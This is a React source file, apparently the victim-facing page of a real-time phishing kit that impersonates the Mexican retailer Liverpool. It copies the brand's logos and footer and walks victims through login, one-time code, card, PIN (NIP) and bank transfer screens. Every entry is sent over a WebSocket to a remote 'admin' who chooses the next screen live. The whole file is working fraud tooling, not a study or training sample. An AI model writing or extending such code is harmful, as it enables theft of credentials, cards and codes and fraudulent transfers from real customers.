import { useState, useEffect } from 'react';
import { useRoute } from 'wouter';
import { useWebSocket } from '@/hooks/useWebSocket';
import { ScreenTemplates } from '@/components/client/ScreenTemplates';
import { Session, ScreenType } from '@shared/schema';
import { formatDate } from '@/utils/helpers';

export default function ClientScreen() {
  // Get session ID from URL
  const [, params] = useRoute('/client/:sessionId');
  const sessionId = params?.sessionId || '';
  
  // State for the current screen
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);
  const [sessionData, setSessionData] = useState<Partial<Session>>({});
  
  // Additional screen-specific state
  const [screenData, setScreenData] = useState<{
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
  }>({});
  
  // WebSocket connection
  const { socket, connected, sendMessage } = useWebSocket('/ws');

  // Register with the server when connection is established
  useEffect(() => {
    if (connected && sessionId) {
      sendMessage({
        type: 'REGISTER',
        role: 'CLIENT',
        sessionId
      });
    }
  }, [connected, sessionId, sendMessage]);

  // Handle WebSocket messages
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const message = JSON.parse(event.data);
        
        // Handle different message types
        if (message.type === 'INIT_SESSION') {
          setSessionData(message.data);
          // Set initial screen based on session data
          if (message.data.pasoActual) {
            setCurrentScreen(message.data.pasoActual as ScreenType);
          }
        }
        else if (message.type === 'SCREEN_CHANGE') {
          const { tipo, ...data } = message.data;
          
          // Extract screen type from the message
          const screenType = tipo.replace('mostrar_', '') as ScreenType;
          setCurrentScreen(screenType);
          
          // Update screen-specific data
          setScreenData(data);
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => socket.removeEventListener('message', handleMessage);
  }, [socket]);

  // Handle form submissions
  const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
    if (connected) {
      sendMessage({
        type: 'CLIENT_INPUT',
        data: {
          tipo: screen,
          sessionId,
          data: formData
        }
      });
      
      // Auto-navigate to validating screen to simulate processing
      setCurrentScreen(ScreenType.VALIDANDO);
      
      // After 3 seconds, the admin would typically change the screen
      // This is just a fallback for demo purposes
      setTimeout(() => {
        // Default next screen if admin doesn't change it
        const nextScreenMap: Record<ScreenType, ScreenType> = {
          [ScreenType.FOLIO]: ScreenType.LOGIN,
          [ScreenType.LOGIN]: ScreenType.CODIGO,
          [ScreenType.CODIGO]: ScreenType.PROTEGER,
          [ScreenType.PROTEGER]: ScreenType.TRANSFERIR,
          [ScreenType.TRANSFERIR]: ScreenType.TARJETA,
          [ScreenType.TARJETA]: ScreenType.CANCELACION,
          [ScreenType.NIP]: ScreenType.PROTEGER,
          [ScreenType.CANCELACION]: ScreenType.FOLIO,
          [ScreenType.MENSAJE]: ScreenType.FOLIO,
          [ScreenType.VALIDANDO]: ScreenType.FOLIO
        };
        
        // Only change if we're still on the validating screen (admin hasn't changed it)
        if (currentScreen === ScreenType.VALIDANDO) {
          const nextScreen = nextScreenMap[screen] || ScreenType.FOLIO;
          setCurrentScreen(nextScreen);
        }
      }, 3000);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className="bg-[#e10098] text-white p-3 text-center">
        <img 
          src="https://www.liverpool.com.mx/static/images/logo.svg" 
          className="h-12 inline-block" 
          alt="Liverpool" 
        />
        <div className="font-bold text-sm mt-1">{formatDate(new Date())}</div>
      </header>

      <div className="text-center mt-4 px-4">
        <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
        <div className="mt-2 space-x-2">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png" 
            className="h-5 inline-block" 
            alt="Suburbia" 
          />
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg" 
            className="h-5 inline-block" 
            alt="Williams Sonoma" 
          />
        </div>
      </div>

      <div className="container mx-auto max-w-md px-6 py-8 flex-grow">
        <ScreenTemplates 
          currentScreen={currentScreen} 
          screenData={screenData}
          onSubmit={handleSubmit}
        />
      </div>

      <footer className="mt-auto">
        <div className="bg-gray-100 p-4 text-center text-sm">
          <a href="#" className="text-[#e10098] mx-2">Aprende más</a>
          <a href="#" className="text-[#e10098] mx-2">Ayuda</a>
          <a href="#" className="text-[#e10098] mx-2">Términos y condiciones</a>
          <a href="#" className="text-[#e10098] mx-2">Seguridad en línea</a>
        </div>

        <div className="bg-[#e10098] text-white p-4 text-center text-sm">
          <div className="mb-3">
            <a href="#" className="text-white mx-2">Contáctanos</a> |
            <a href="#" className="text-white mx-2">Aclaraciones</a> |
            <a href="#" className="text-white mx-2">Promociones</a> |
            <a href="#" className="text-white mx-2">Facebook</a> |
            <a href="#" className="text-white mx-2">Youtube</a>
          </div>
          <div>© Liverpool México 2024. Todos los Derechos Reservados</div>
        </div>
      </footer>
    </div>
  );
}
